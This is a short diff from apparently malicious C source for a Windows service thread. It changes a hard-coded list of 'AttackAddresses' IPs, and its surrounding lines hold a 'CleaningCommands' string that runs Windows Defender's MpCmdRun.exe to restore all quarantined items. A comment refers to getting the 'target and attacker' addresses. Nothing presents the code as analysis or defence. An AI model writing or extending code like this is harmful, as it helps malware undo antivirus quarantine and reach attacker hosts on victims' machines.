@@ -21,7 +21,7 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam)
     const char* CleaningCommands =
         "cd \"%ProgramFiles%\\Windows Defender\" && "
         "MpCmdRun.exe -Restore -All";
-    const char* AttackAddresses = "172.25.224.1~172.29.32.1~172.20.32.1~172.20.240.1~172.27.144.1~172.28.112.1~172.17.96.1~192.168.47.1~192.168.5.1~192.168.1.21~172.21.64.1~192.168.56.1";
+    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
 
 
     // Get IP addresses of target and attacker:
